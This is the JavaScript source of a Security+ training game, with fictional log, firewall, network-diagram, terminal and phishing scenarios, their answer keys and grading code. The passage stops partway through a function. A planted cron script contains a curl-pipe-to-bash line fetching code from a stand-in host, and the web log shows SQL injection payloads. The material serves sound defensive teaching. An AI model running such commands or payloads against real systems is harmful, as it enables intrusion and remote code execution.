// Security+ Quest: performance-based simulations.
// Five interactive PBQ types: log analysis, firewall rule builder, network diagram, terminal sim, phishing inspector.
// Every scenario is fictional: IPs come from documentation ranges (192.0.2.x, 198.51.100.x, 203.0.113.x, 10.x),
// and companies, people and domains are invented (.example).
// All types share one interface with MATCH/ORDER, so they work in PBQ Lab, boss specials and practice exams.

// ---------------- scenario data ----------------
const SIMS=[
// ===== 1. Log analysis =====
{kind:'log',s:{d:2,o:'2.4',title:'Auth log: who got in?',file:'/var/log/auth.log (web01)',
  brief:'The SOC flagged unusual SSH activity on web01 overnight. Review the log (use grep to filter) and answer the questions.',
  lines:[
  'Nov 18 02:11:47 web01 sshd[2201]: Accepted publickey for deploy from 10.0.4.12 port 50122 ssh2',
  'Nov 18 02:14:01 web01 sshd[2210]: Failed password for root from 203.0.113.45 port 51122 ssh2',
  'Nov 18 02:14:02 web01 sshd[2210]: Failed password for root from 203.0.113.45 port 51122 ssh2',
  'Nov 18 02:14:02 web01 sshd[2213]: Failed password for root from 203.0.113.45 port 51130 ssh2',
  'Nov 18 02:14:03 web01 sshd[2216]: Failed password for invalid user admin from 203.0.113.45 port 51141 ssh2',
  'Nov 18 02:14:04 web01 sshd[2216]: Failed password for invalid user admin from 203.0.113.45 port 51141 ssh2',
  'Nov 18 02:14:05 web01 sshd[2219]: Failed password for svc_backup from 203.0.113.45 port 51160 ssh2',
  'Nov 18 02:14:05 web01 sshd[2219]: Failed password for svc_backup from 203.0.113.45 port 51160 ssh2',
  'Nov 18 02:14:06 web01 sshd[2222]: Failed password for svc_backup from 203.0.113.45 port 51172 ssh2',
  'Nov 18 02:14:09 web01 sshd[2225]: Accepted password for svc_backup from 203.0.113.45 port 51188 ssh2',
  'Nov 18 02:14:09 web01 sshd[2225]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)',
  'Nov 18 02:15:30 web01 sudo:  svc_backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash',
  'Nov 18 02:31:12 web01 sshd[2301]: Accepted publickey for deploy from 10.0.4.12 port 50410 ssh2'],
  qs:[
  {q:'Which source IP is the attacker?',opts:['203.0.113.45','10.0.4.12','198.51.100.7','192.0.2.10'],a:0,why:'203.0.113.45 produced every failed login, then a successful one. 10.0.4.12 is the normal deploy key login.'},
  {q:'Which account was compromised?',opts:['svc_backup','root','deploy','admin'],a:0,why:'Line 10 shows "Accepted password for svc_backup" from the attacker IP right after repeated failures.'},
  {q:'Which attack does the pattern show?',opts:['Brute-force password guessing','Password spraying','Pass-the-hash','Session replay'],a:0,why:'Many rapid guesses against a few accounts from one IP is brute force. Spraying tries one password across many accounts.'},
  {q:'What did the attacker do right after logging in?',opts:['Escalated to a root shell with sudo','Deleted the auth log','Added an SSH key for deploy','Rebooted the server'],a:0,why:'Line 12: svc_backup ran /bin/bash as root through sudo, which is privilege escalation.'}]}},
{kind:'log',s:{d:2,o:'2.4',title:'Web server log: spot the injection',file:'/var/log/nginx/access.log (shop.halvorsen-freight.example)',
  brief:'Customers report the product page acting strangely. Find the attacker and the attack in the web server log.',
  lines:[
  '198.51.100.12 - - [18/Nov:09:01:10] "GET /products.php?id=14 HTTP/1.1" 200 5120 "Mozilla/5.0"',
  '192.0.2.88 - - [18/Nov:09:01:31] "GET /cart.php HTTP/1.1" 200 2210 "Mozilla/5.0"',
  '198.51.100.23 - - [18/Nov:09:02:02] "GET /products.php?id=14\' HTTP/1.1" 500 312 "sqlmap/1.7"',
  '198.51.100.23 - - [18/Nov:09:02:03] "GET /products.php?id=14\' OR \'1\'=\'1 HTTP/1.1" 200 98211 "sqlmap/1.7"',
  '198.51.100.23 - - [18/Nov:09:02:05] "GET /products.php?id=14 UNION SELECT username,password FROM users-- HTTP/1.1" 200 143877 "sqlmap/1.7"',
  '192.0.2.88 - - [18/Nov:09:02:40] "POST /checkout.php HTTP/1.1" 302 0 "Mozilla/5.0"',
  '198.51.100.12 - - [18/Nov:09:03:12] "GET /images/logo.png HTTP/1.1" 200 8812 "Mozilla/5.0"',
  '203.0.113.9 - - [18/Nov:09:03:55] "GET /robots.txt HTTP/1.1" 200 64 "Googlebot-like/2.1"'],
  qs:[
  {q:'Which IP is attacking the site?',opts:['198.51.100.23','198.51.100.12','192.0.2.88','203.0.113.9'],a:0,why:'Only 198.51.100.23 sends quotes, OR 1=1 and UNION SELECT, using an automated tool user agent.'},
  {q:'Which attack is it?',opts:['SQL injection','Cross-site scripting','Directory traversal','Cross-site request forgery'],a:0,why:'The id parameter is being altered with SQL syntax to change the database query.'},
  {q:'Which evidence BEST suggests the attack succeeded?',opts:['The UNION SELECT request returned 200 with a much larger response','The first request returned a 500 error','The attacker requested robots.txt','A customer POSTed to checkout'],a:0,why:'A normal page is about 5 KB; a 200 response of 143 KB to UNION SELECT suggests user data was returned. The 500 only shows the input broke a query.'},
  {q:'Which control would BEST prevent this in the code?',opts:['Parameterized queries','Output encoding','Anti-CSRF tokens','Rate limiting robots.txt'],a:0,why:'Prepared statements keep input from being executed as SQL. A WAF can help as a compensating control.'}]}},
// ===== 2. Firewall rule builder =====
{kind:'fw',s:{d:3,o:'3.2',title:'Firewall: lock down the DMZ web server',
  brief:'Build the ACL for the DMZ firewall. Requirements: the internet reaches the web server over HTTPS only. LAN admins manage it over SSH. The web server talks to the database on 1433. Telnet is blocked everywhere. Everything else is denied (there is an implicit deny at the end).',
  hosts:{Internet:'any outside address',LAN:'10.0.1.0/24 (staff)',WEB:'10.0.2.10 (DMZ web server)',DB:'10.0.3.5 (SQL server)'},
  pool:[
  {id:'a',act:'allow',src:'Internet',dst:'WEB',port:'tcp/443'},
  {id:'b',act:'allow',src:'LAN',dst:'WEB',port:'tcp/22'},
  {id:'c',act:'allow',src:'Internet',dst:'WEB',port:'tcp/22'},
  {id:'d',act:'allow',src:'any',dst:'any',port:'any'},
  {id:'e',act:'deny',src:'any',dst:'any',port:'tcp/23'},
  {id:'f',act:'allow',src:'WEB',dst:'DB',port:'tcp/1433'},
  {id:'g',act:'allow',src:'Internet',dst:'DB',port:'tcp/1433'},
  {id:'h',act:'allow',src:'Internet',dst:'WEB',port:'tcp/80'}],
  tests:[
  {src:'Internet',dst:'WEB',port:'tcp/443',expect:'allow'},{src:'LAN',dst:'WEB',port:'tcp/22',expect:'allow'},
  {src:'Internet',dst:'WEB',port:'tcp/22',expect:'deny'},{src:'Internet',dst:'WEB',port:'tcp/23',expect:'deny'},
  {src:'WEB',dst:'DB',port:'tcp/1433',expect:'allow'},{src:'Internet',dst:'DB',port:'tcp/1433',expect:'deny'},
  {src:'LAN',dst:'WEB',port:'tcp/23',expect:'deny'},{src:'Internet',dst:'WEB',port:'tcp/80',expect:'deny'}],
  key:['a','b','f'],why:'Allow only HTTPS from the internet, SSH from the LAN and 1433 from the web server. Do not add any-to-any or internet SSH, HTTP or SQL. The implicit deny blocks the rest, including Telnet.'}},
{kind:'fw',s:{d:4,o:'4.5',title:'Firewall: order matters',
  brief:'Staff on the LAN may browse the web (HTTP and HTTPS), but threat intel says block the malicious server BADHOST (198.51.100.66) completely. DNS must only go to the internal resolver. Rules are checked top to bottom and the first match wins.',
  hosts:{LAN:'10.0.1.0/24 (staff)',Internet:'any outside address',BADHOST:'198.51.100.66 (on the internet)',DNS:'10.0.0.53 (internal resolver)'},
  parent:{BADHOST:'Internet'},
  pool:[
  {id:'a',act:'deny',src:'LAN',dst:'BADHOST',port:'any'},
  {id:'b',act:'allow',src:'LAN',dst:'Internet',port:'tcp/443'},
  {id:'c',act:'allow',src:'LAN',dst:'Internet',port:'tcp/80'},
  {id:'d',act:'allow',src:'LAN',dst:'DNS',port:'udp/53'},
  {id:'e',act:'allow',src:'LAN',dst:'Internet',port:'udp/53'},
  {id:'f',act:'allow',src:'LAN',dst:'any',port:'any'}],
  tests:[
  {src:'LAN',dst:'Internet',port:'tcp/443',expect:'allow'},{src:'LAN',dst:'BADHOST',port:'tcp/443',expect:'deny'},
  {src:'LAN',dst:'BADHOST',port:'tcp/80',expect:'deny'},{src:'LAN',dst:'DNS',port:'udp/53',expect:'allow'},
  {src:'LAN',dst:'Internet',port:'udp/53',expect:'deny'},{src:'LAN',dst:'Internet',port:'tcp/80',expect:'allow'},
  {src:'LAN',dst:'Internet',port:'tcp/25',expect:'deny'}],
  key:['a','b','c','d'],why:'The BADHOST deny must come before the broad web allows, or HTTPS to it matches the allow first. Only allow DNS to the internal resolver, and never add allow-any.'}},
// ===== 3. Network diagram =====
{kind:'net',s:{d:3,o:'3.2',title:'Place the security devices',
  brief:'Drag each device to the spot on the network map where it does its job (or tap a device, then tap a spot). One device is left over.',
  devices:['Firewall','WAF','Load balancer','VPN concentrator','IPS','IDS','Honeypot'],
  slots:[
  {id:'s1',x:25,y:30,a:'Firewall',hint:'Network edge: filters all traffic entering from the internet'},
  {id:'s2',x:50,y:11,a:'WAF',hint:'In front of the web apps: inspects HTTP for SQLi and XSS'},
  {id:'s3',x:70,y:11,a:'Load balancer',hint:'Spreads requests across three web servers'},
  {id:'s4',x:50,y:30,a:'VPN concentrator',hint:'Terminates encrypted tunnels from remote staff'},
  {id:'s5',x:50,y:49,a:'IPS',hint:'Inline on the internal segment, blocks attacks as they pass'},
  {id:'s6',x:70,y:58,a:'IDS',hint:'Watches a copy of traffic from a SPAN port, alerts only'}],
  nodes:[{x:8,y:30,t:'Internet'},{x:8,y:46,t:'Remote staff'},{x:37,y:30,t:'Core switch'},{x:89,y:11,t:'Web servers x3'},{x:89,y:49,t:'Staff LAN'},{x:70,y:49,t:'SPAN port'}],
  links:[[8,30,25,30],[25,30,37,30],[37,30,50,11],[50,11,70,11],[70,11,89,11],[37,30,50,30],[8,46,50,30],[37,30,50,49],[50,49,89,49],[70,49,70,58]],
  zones:[{x:40,y:2,w:58,h:18,t:'Screened subnet (DMZ)'},{x:40,y:40,w:58,h:24,t:'Internal network'}],
  why:'Firewall at the edge, WAF in front of the web apps, load balancer before the server pool, VPN concentrator for remote tunnels, IPS inline (it must be in the path to block), IDS on a SPAN copy (passive). The honeypot is a decoy, not part of this design.'}},
{kind:'net',s:{d:4,o:'4.4',title:'Build out monitoring and admin access',
  brief:'Place each component where it belongs. One component is left over.',
  devices:['Jump server','SIEM','Honeypot','NAC (802.1X)','Reverse proxy','DLP','UTM'],
  slots:[
  {id:'s1',x:50,y:10,a:'Honeypot',hint:'Decoy in the DMZ that alerts when touched'},
  {id:'s2',x:72,y:10,a:'Reverse proxy',hint:'Fronts and hides the internal web application'},
  {id:'s3',x:30,y:52,a:'Jump server',hint:'The only path admins use to reach servers'},
  {id:'s4',x:72,y:52,a:'NAC (802.1X)',hint:'Authenticates devices at the access switch before they join'},
  {id:'s5',x:50,y:34,a:'SIEM',hint:'Collects and correlates logs from every system'},
  {id:'s6',x:25,y:22,a:'DLP',hint:'Egress point: stops sensitive data from leaving'}],
  nodes:[{x:8,y:22,t:'Internet'},{x:40,y:22,t:'Firewall'},{x:90,y:10,t:'Intranet app'},{x:10,y:52,t:'Admin laptops'},{x:50,y:58,t:'Server VLAN'},{x:90,y:52,t:'Office ports'}],
  links:[[8,22,25,22],[25,22,40,22],[40,22,50,10],[50,10,72,10],[72,10,90,10],[40,22,50,34],[10,52,30,52],[30,52,50,58],[50,34,50,58],[50,58,72,52],[72,52,90,52]],
  zones:[{x:44,y:2,w:54,h:16,t:'DMZ'},{x:22,y:44,w:76,h:20,t:'Internal'}],
  why:'Honeypot in the DMZ as a decoy, reverse proxy in front of the web app, jump server between admins and servers, NAC at the access ports, SIEM collecting from everything, DLP at the egress. A UTM would combine several roles at the edge, but each spot here needs a specific function.'}},
// ===== 4. Terminal sim =====
{kind:'term',s:{d:4,o:'4.9',title:'Terminal: investigate web01',
  brief:'You have a shell on web01 after an alert. Use commands to investigate, then answer. Try: nmap 10.0.2.10, netstat -ant, ls -l /opt/scripts, cat /opt/scripts/backup.sh, grep Failed /var/log/auth.log, chmod.',
  host:'web01',user:'analyst',cwd:'/home/analyst',try:['nmap 10.0.2.10','netstat -ant','ls -l /opt/scripts','cat /opt/scripts/backup.sh','grep Failed /var/log/auth.log','chmod o-w /opt/scripts/backup.sh'],
  motd:'web01 (10.0.2.10) | incident ticket IR-2291 | type "help" for commands',
  fs:{
   '/opt/scripts/backup.sh':{perm:'-rwxrwxrwx',owner:'root',content:'#!/bin/bash\ntar czf /backup/www.tgz /var/www\ncurl -s http://203.0.113.77:8080/u.sh | bash'},
   '/opt/scripts/rotate.sh':{perm:'-rwxr-x---',owner:'root',content:'#!/bin/bash\nlogrotate /etc/logrotate.conf'},
   '/etc/cron.d/backup':{perm:'-rw-r--r--',owner:'root',content:'*/5 * * * * root /opt/scripts/backup.sh'},
   '/var/log/auth.log':{perm:'-rw-r-----',owner:'syslog',content:'Nov 18 02:14:01 web01 sshd[2210]: Failed password for root from 203.0.113.77 port 51122\nNov 18 02:14:05 web01 sshd[2219]: Failed password for www-data from 203.0.113.77 port 51160\nNov 18 02:14:09 web01 sshd[2225]: Accepted password for www-data from 203.0.113.77 port 51188\nNov 18 02:31:12 web01 sshd[2301]: Accepted publickey for deploy from 10.0.4.12 port 50410'},
   '/home/analyst/notes.txt':{perm:'-rw-r--r--',owner:'analyst',content:'IR-2291: alert on outbound traffic to 203.0.113.77. Check listeners and cron jobs.'}},
  nmap:{'10.0.2.10':'Starting Nmap 7.94\nNmap scan report for web01 (10.0.2.10)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n23/tcp   open  telnet\n443/tcp  open  https\n4444/tcp open  krb524\nNmap done: 1 IP address (1 host up)',
        'localhost':'@10.0.2.10','127.0.0.1':'@10.0.2.10','web01':'@10.0.2.10'},
  netstat:'Proto Local Address      Foreign Address       State\ntcp   0.0.0.0:22         0.0.0.0:*             LISTEN\ntcp   0.0.0.0:23         0.0.0.0:*             LISTEN\ntcp   0.0.0.0:443        0.0.0.0:*             LISTEN\ntcp   0.0.0.0:4444       0.0.0.0:*             LISTEN\ntcp   10.0.2.10:443      198.51.100.10:52113   ESTABLISHED\ntcp   10.0.2.10:4444     203.0.113.77:40122    ESTABLISHED\ntcp   10.0.2.10:22       10.0.4.12:50410       ESTABLISHED',
  ping:{'203.0.113.77':'PING 203.0.113.77: 64 bytes, time=41 ms (3 of 3 replies)','10.0.4.12':'PING 10.0.4.12: 64 bytes, time=0.4 ms (3 of 3 replies)'},
  dig:{},
  qs:[
  {q:'Which open port is an insecure clear-text remote login that should be disabled?',opts:['23/tcp (telnet)','22/tcp (ssh)','443/tcp (https)','4444/tcp'],a:0,why:'nmap and netstat show telnet listening on 23. Telnet sends credentials in clear text; use SSH.'},
  {q:'Which remote IP has an established connection to the suspicious listener on 4444?',opts:['203.0.113.77','198.51.100.10','10.0.4.12','127.0.0.1'],a:0,why:'netstat shows 10.0.2.10:4444 ESTABLISHED to 203.0.113.77, the same IP in the alert and the tampered script.'},
  {q:'The cron script /opt/scripts/backup.sh is world-writable and was tampered with. Which command removes write access for other users?',opts:['chmod o-w /opt/scripts/backup.sh','chmod 777 /opt/scripts/backup.sh','chmod +x /opt/scripts/backup.sh','grep backup /etc/cron.d/backup'],a:0,why:'o-w removes write for "others". 777 makes it worse, +x only adds execute. Root runs this script every 5 minutes, so anyone could have added the curl line.'}]}},
{kind:'term',s:{d:2,o:'2.4',title:'Terminal: why does the intranet look wrong?',
  brief:'Users on this laptop land on a fake intranet login page. Use ping, dig, cat and grep to find out why. Try: ping intranet.corp.example, dig intranet.corp.example, cat /etc/hosts.',
  host:'lt-0417',user:'analyst',cwd:'/home/analyst',try:['ping intranet.corp.example','dig intranet.corp.example','cat /etc/hosts','ls -l /etc','grep intranet /etc/hosts','netstat -ant'],
  motd:'lt-0417 | helpdesk ticket HD-5520 "intranet asks for my password twice" | type "help"',
  fs:{
   '/etc/hosts':{perm:'-rw-rw-rw-',owner:'root',content:'127.0.0.1       localhost\n198.51.100.66   intranet.corp.example\n::1             localhost'},
   '/etc/resolv.conf':{perm:'-rw-r--r--',owner:'root',content:'nameserver 10.0.0.53\nsearch corp.example'},
   '/home/analyst/ticket.txt':{perm:'-rw-r--r--',owner:'analyst',content:'HD-5520: user says the intranet login page looks slightly different and asked for MFA twice.'}},
  nmap:{},netstat:'Proto Local Address      Foreign Address       State\ntcp   10.0.1.47:51522    198.51.100.66:443     ESTABLISHED\ntcp   10.0.1.47:51530    10.0.0.53:53          TIME_WAIT',
  ping:{'intranet.corp.example':'PING intranet.corp.example (198.51.100.66): 64 bytes, time=38 ms (3 of 3 replies)','10.0.1.20':'PING 10.0.1.20: 64 bytes, time=0.6 ms (3 of 3 replies)','198.51.100.66':'PING 198.51.100.66: 64 bytes, time=38 ms (3 of 3 replies)'},
  dig:{'intranet.corp.example':';; QUESTION SECTION:\n;intranet.corp.example.   IN  A\n;; ANSWER SECTION:\nintranet.corp.example. 300 IN A 10.0.1.20\n;; SERVER: 10.0.0.53#53'},
  qs:[
  {q:'What address does the company DNS server return for intranet.corp.example?',opts:['10.0.1.20','198.51.100.66','10.0.0.53','127.0.0.1'],a:0,why:'dig asks the DNS server directly (10.0.0.53), which answers 10.0.1.20.'},
  {q:'Why do ping and the browser go to 198.51.100.66 instead?',opts:['A tampered hosts file entry overrides DNS','The company DNS server was poisoned','DHCP handed out the wrong gateway','ARP spoofing on the LAN'],a:0,why:'The hosts file is checked before DNS, and it maps the intranet name to an outside address. DNS itself answers correctly.'},
  {q:'Which file should be fixed and watched with file integrity monitoring?',opts:['/etc/hosts','/etc/resolv.conf','/home/analyst/ticket.txt','/var/log/syslog'],a:0,why:'/etc/hosts holds the malicious entry, and it is world-writable (-rw-rw-rw-), which is also a misconfiguration.'}]}},
// ===== 5. Phishing inspector =====
{kind:'phish',s:{d:2,o:'2.2',title:'Phishing inspector: payroll update',
  brief:'Click every part of this email that is a red flag. Leave normal parts unflagged. Hover or focus a link to see where it really goes.',
  items:[
  {id:'from',label:'From',text:'"Halvorsen Freight HR" <hr-notice@halvorsen-freiqht.example>',flag:true,why:'Look-alike domain: "freiqht" uses a q in place of the g (typosquatting).'},
  {id:'reply',label:'Reply-To',text:'payroll.dept.2291@freemail.example',flag:true,why:'Replies go to a free webmail address, not the company domain.'},
  {id:'to',label:'To',text:'jordan.lee@halvorsen-freight.example',flag:false,why:'Your real address. Normal.'},
  {id:'date',label:'Date',text:'Tue, 18 Nov 2026 07:42:10 -0500',flag:false,why:'A normal business-hours timestamp.'},
  {id:'auth',label:'Authentication-Results',text:'spf=fail dkim=none dmarc=fail',flag:true,why:'SPF and DMARC failed and there is no DKIM signature, so the sender is not authorized for that domain.'},
  {id:'subj',label:'Subject',text:'URGENT: Confirm your direct deposit by 5 PM today or payment is held',flag:true,why:'Pressure and a deadline are classic social engineering urgency.'},
  {id:'greet',area:'body',text:'Dear Employee,',flag:true,why:'A generic greeting where HR would use your name.'},
  {id:'p1',area:'body',text:'Our payroll provider is moving to a new portal. To avoid a delay in this week\'s pay, confirm your bank details now.',flag:false,why:'Plain context text; the request itself is covered by the link and urgency flags.'},
  {id:'link',area:'link',text:'https://portal.halvorsen-freight.example/payroll',href:'http://halvorsen-freight.example.verify-login.example/payroll',flag:true,why:'The real destination is a different domain (verify-login.example) over plain HTTP, not the text shown.'},
  {id:'link2',area:'link',text:'Privacy policy',href:'https://halvorsen-freight.example/privacy',flag:false,why:'The link text and destination match the real company domain over HTTPS.'},
  {id:'att',area:'att',text:'Payroll_Form.pdf.exe (412 KB)',flag:true,why:'A double extension hides an executable behind a fake .pdf name.'},
  {id:'sig',area:'body',text:'Halvorsen Freight People Team | 1200 Harbor Way, Port Ellis',flag:false,why:'A signature block proves nothing either way; it is not a red flag by itself.'}]}},
{kind:'phish',s:{d:2,o:'2.2',title:'Phishing inspector: the CEO needs a favor',
  brief:'This one is subtler. Flag only the parts that are red flags. Not every email has a bad link or attachment.',
  items:[
  {id:'from',label:'From',text:'"Dana Whitfield, CEO" <dana.whitfield@brightmeadow-health.example>',flag:false,why:'The display name and address match the real company domain. The trick is elsewhere.'},
  {id:'reply',label:'Reply-To',text:'dana.whitfield.ceo@freemail.example',flag:true,why:'Replies are redirected to a personal webmail account, a hallmark of business email compromise.'},
  {id:'to',label:'To',text:'accounts@brightmeadow-health.example',flag:false,why:'A normal team mailbox.'},
  {id:'auth',label:'Authentication-Results',text:'spf=pass dkim=pass dmarc=pass',flag:false,why:'The message passed checks, which is why BEC is hard: it may come from a compromised or real account.'},
  {id:'subj',label:'Subject',text:'Quick favor - are you at your desk?',flag:true,why:'A vague, urgent hook designed to start a conversation outside normal process.'},
  {id:'p1',area:'body',text:'I\'m in back-to-back board meetings and can\'t take calls. Please keep this between us for now.',flag:true,why:'Unavailability plus secrecy is meant to stop you from verifying the request.'},
  {id:'p2',area:'body',text:'I need six $200 gift cards for client thank-yous before noon. Send me the codes by reply.',flag:true,why:'Gift cards are untraceable and a top BEC payout method. Verify by phone using a known number.'},
  {id:'sig',area:'body',text:'Sent from my phone',flag:false,why:'Common on legitimate mail; not a red flag by itself.'}]}}
];

// ---------------- shared helpers ----------------
function allPbqs(){return MATCH.map(s=>({kind:'match',s})).concat(ORDER.map(s=>({kind:'order',s})),SIMS)}
function pbqProgress(p,st){
  st=st||{};
  if(p.kind==='match')return{have:Object.keys(st.link||{}).length,need:p.s.pairs.length};
  if(p.kind==='order')return{have:(st.seq||[]).length,need:p.s.items.length};
  return SIM_KINDS[p.kind].progress(p.s,st);
}
function pbqScoreOf(p,st){
  st=st||{};const s=p.s;
  if(p.kind==='match'){const l=st.link||{};return{r:s.pairs.filter((x,i)=>l[i]===i).length,t:s.pairs.length}}
  if(p.kind==='order'){const q=st.seq||[];return{r:q.filter((x,pos)=>x===pos).length,t:s.items.length}}
  return SIM_KINDS[p.kind].score(s,st);
}
function pbqAnswerHtml(p){
  if(p.kind==='match')return p.s.pairs.map(x=>`${esc(x[0])} &rarr; ${esc(x[1])}`).join('<br>');
  if(p.kind==='order')return p.s.items.map((x,i)=>`${i+1}. ${esc(x)}`).join('<br>');
  return SIM_KINDS[p.kind].answerHtml(p.s);
}
const kindLabel=k=>({match:'Match',order:'Order',log:'Log analysis',fw:'Firewall rules',net:'Network diagram',term:'Terminal',phish:'Phishing inspector'})[k]||k;
function hilite(text,f){
  const e=esc(text);if(!f)return e;
  const re=new RegExp(esc(f).replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');
  return e.replace(re,m=>`<mark>${m}</mark>`);
}
const mcqBlock=(qs,st,checked)=>`<div class="simqs">${qs.map((q,qi)=>`<div class="simq"><b>${qi+1}. ${esc(q.q)}</b><div class="simopts">${q.opts.map((o,oi)=>{let c='mi';if(st.ans[qi]===oi)c+=' sel';if(checked){if(oi===q.a)c+=' correct';else if(st.ans[qi]===oi)c+=' wrong'}return `<button class="${c}" data-q="${qi}" data-o="${oi}" ${checked?'disabled':''}>${esc(o)}</button>`}).join('')}</div>${checked?`<p class="tiny simwhy">${esc(q.why)}</p>`:''}</div>`).join('')}</div>`;
const mcqBind=(el,st,ui)=>el.querySelectorAll('[data-q]').forEach(b=>b.onclick=()=>{st.ans[+b.dataset.q]=+b.dataset.o;sfx.tick();ui.changed()});
const mcqScore=(qs,st)=>({r:qs.filter((q,i)=>(st.ans||{})[i]===q.a).length,t:qs.length});

// Generic runner: header, body, check / continue (practice) or progress line (exam mode).
function simRun(el,s,onDone,opts,K){
  opts=opts||{};const st=opts.state||{};K.init(st,s);
  const ui={checked:false,exam:!!opts.exam,redraw:()=>draw(),changed:()=>{if(opts.onChange)opts.onChange();draw()}};
  const draw=()=>{
    const pr=K.progress(s,st),sc=K.score(s,st);
    el.onclick=null;
    el.innerHTML=`<div class="pbq sim sim-${K.cls}">
      <div class="qmeta"><span class="chip pbqchip">PBQ &middot; ${K.label}</span>${opts.chip?`<span class="chip">${opts.chip}</span>`:''}${s.o?`<span class="chip obj">obj ${s.o}</span>`:''}</div>
      <h3>${esc(s.title)}</h3>${s.brief?`<p class="sbrief">${esc(s.brief)}</p>`:''}
      ${K.body(s,st,ui)}
      ${ui.checked?`<div class="fb ${sc.r===sc.t?'ok':'no'}"><div><b class="pix">${sc.r} / ${sc.t} correct</b>${K.review?K.review(s,st):''}</div><button class="btn" data-sim="cont">Continue &rarr;</button></div>`
        :`<div class="row">${opts.exam?`<span class="tiny">${pr.have} / ${pr.need} done &middot; graded when you submit the exam</span>`:`<button class="btn" data-sim="check" ${pr.have>=pr.need?'':'disabled'}>Check answers</button><span class="tiny">${pr.have} / ${pr.need} done</span>`}</div>`}
    </div>`;
    K.bind(el,s,st,ui);
    const ck=el.querySelector('[data-sim=check]');if(ck)ck.onclick=()=>{ui.checked=true;const v=K.score(s,st);v.r===v.t?sfx.win():sfx.hurt();draw()};
    const ct=el.querySelector('[data-sim=cont]');if(ct){ct.onclick=()=>onDone(sc.r,sc.t);ct.focus({preventScroll:true})}
  };
  UI.keyHandler=e=>{if(ui.checked&&e.key==='Enter'){e.preventDefault();const v=K.score(s,st);onDone(v.r,v.t)}};
  draw();
}

// ---------------- 1. log analysis ----------------
const LOG_K={cls:'log',label:'Log analysis',
  init(st){st.ans=st.ans||{};st.filter=st.filter||''},
  progress(s,st){return{have:Object.keys(st.ans||{}).length,need:s.qs.length}},
  score(s,st){return mcqScore(s.qs,st)},
  body(s,st,ui){
    const f=st.filter.toLowerCase(),lines=s.lines.map((l,i)=>({l,i})).filter(x=>!f||x.l.toLowerCase().includes(f));
    return `<div class="logbox"><div class="logbar"><span class="pix">${esc(s.file)}</span>
      <label class="tiny" for="logFilter">$ grep</label><input id="logFilter" value="${esc(st.filter)}" placeholder="filter lines, e.g. Failed" autocomplete="off" spellcheck="false">
      <span class="tiny">${lines.length} / ${s.lines.length} lines</span></div>
      <pre class="logpre" tabindex="0" aria-label="Log lines">${lines.map(x=>`<span class="ll"><i>${String(x.i+1).padStart(2,' ')}</i> ${hilite(x.l,st.filter)}</span>`).join('\n')||'<span class="tiny">no lines match</span>'}</pre></div>
      ${mcqBlock(s.qs,st,ui.checked)}`;
  },
  bind(el,s,st,ui){
    const inp=el.querySelector('#logFilter');
    inp.oninput=()=>{st.filter=inp.value;const p=inp.selectionStart;ui.redraw();const i2=el.querySelector('#logFilter');i2.focus();i2.setSelectionRange(p,p)};
    mcqBind(el,st,ui);
  },
  answerHtml(s){return s.qs.map((q,i)=>`${i+1}. ${esc(q.q)} <span class="yes">${esc(q.opts[q.a])}</span>`).join('<br>')},
  run(el,s,onDone,opts){simRun(el,s,onDone,opts,LOG_K)}
};

// ---------------- 2. firewall rule builder ----------------
const fwMatch=(rule,val,s)=>rule==='any'||rule===val||(s.parent&&s.parent[val]===rule);
const FW_K={cls:'fw',label:'Firewall rules',
  init(st){st.rules=st.rules||[];st.tested=st.tested||false},
  progress(s,st){return{have:(st.rules||[]).length?1:0,need:1}},
  evaluate(s,rules,p){
    for(let i=0;i<rules.length;i++){const r=s.pool.find(x=>x.id===rules[i]);if(fwMatch(r.src,p.src,s)&&fwMatch(r.dst,p.dst,s)&&fwMatch(r.port,p.port,s))return{act:r.act,by:i+1}}
    return{act:'deny',by:'implicit'};
  },
  score(s,st){const rules=st.rules||[];if(!rules.length)return{r:0,t:s.tests.length};return{r:s.tests.filter(p=>FW_K.evaluate(s,rules,p).act===p.expect).length,t:s.tests.length}},
  ruleTxt:r=>`<b class="${r.act}">${r.act.toUpperCase()}</b> ${esc(r.src)} &rarr; ${esc(r.dst)} <code>${esc(r.port)}</code>`,
  body(s,st,ui){
    const used=new Set(st.rules),showExp=ui.checked||!ui.exam;
    return `<div class="fwhosts">${Object.entries(s.hosts).map(([k,v])=>`<span><b>${esc(k)}</b> ${esc(v)}</span>`).join('')}</div>
      <div class="fwcols"><div><div class="tiny">Your ACL (top to bottom, first match wins)</div>
        <ol class="acl">${st.rules.map((id,i)=>{const r=s.pool.find(x=>x.id===id);return `<li>${FW_K.ruleTxt(r)}${ui.checked?'':`<span class="aclbtns"><button class="btn ghost sm" data-up="${i}" ${i?'':'disabled'} aria-label="Move up">&uarr;</button><button class="btn ghost sm" data-dn="${i}" ${i<st.rules.length-1?'':'disabled'} aria-label="Move down">&darr;</button><button class="btn ghost sm" data-rm="${i}" aria-label="Remove rule">&times;</button></span>`}</li>`}).join('')}
        <li class="implicit"><b class="deny">DENY</b> any &rarr; any <code>any</code> <span class="tiny">(implicit deny)</span></li></ol></div>
      <div><div class="tiny">Available rules: tap to add</div><div class="fwpool">${s.pool.map(r=>`<button class="mi" data-add="${r.id}" ${used.has(r.id)||ui.checked?'disabled':''}>${FW_K.ruleTxt(r)}</button>`).join('')}</div></div></div>
      <div class="row"><button class="btn ghost sm" data-test="1">&#9654; Run test traffic</button><span class="tiny">See what your ACL does to sample packets${ui.exam?'':' and whether that matches the requirements'}.</span></div>
      ${st.tested||ui.checked?`<div class="fwtests"><table><thead><tr><th>Packet</th><th>Your ACL</th>${showExp?'<th>Required</th>':''}</tr></thead><tbody>${s.tests.map(p=>{const v=FW_K.evaluate(s,st.rules,p),ok=v.act===p.expect;return `<tr class="${showExp?(ok?'pass':'fail'):''}"><td>${esc(p.src)} &rarr; ${esc(p.dst)} <code>${esc(p.port)}</code></td><td><b class="${v.act}">${v.act}</b> <span class="tiny">${v.by==='implicit'?'implicit deny':'rule '+v.by}</span></td>${showExp?`<td>${p.expect} ${ok?'&#10003;':'&#10007;'}</td>`:''}</tr>`}).join('')}</tbody></table></div>`:''}`;
  },
  bind(el,s,st,ui){
    const mv=(i,d)=>{const r=st.rules;[r[i],r[i+d]]=[r[i+d],r[i]];sfx.tick();ui.changed()};
    el.querySelectorAll('[data-add]').forEach(b=>b.onclick=()=>{st.rules.push(b.dataset.add);sfx.tick();ui.changed()});
